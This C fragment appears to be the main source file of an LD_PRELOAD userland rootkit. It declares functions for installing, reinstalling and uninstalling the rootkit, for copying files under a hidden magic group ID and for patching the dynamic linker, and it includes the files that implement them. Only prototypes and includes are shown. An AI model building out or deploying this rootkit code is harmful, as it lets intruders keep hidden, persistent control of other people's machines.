char *sogetplatform(char *sopath);
char *sogetpath(char *sopath);
int socopy(const char *opath, char *npath, gid_t magicgid);
#include "so.c"

#ifdef PATCH_DYNAMIC_LINKER
#include "ldpatch/ldpatch.h"
#endif

void eradicatedir(const char *target);
#ifdef UNINSTALL_MY_ASS
void uninstallass(void);
#endif
void uninstallbdv(void);
#include "uninstall.c"

int rknomore(void);
int _preloadok(const char *preloadpath);
int preloadok(void);
void reinstall(const char *preloadpath);
#include "reinstall.c"

void bdvinstall(char *const argv[]);
#include "install.c"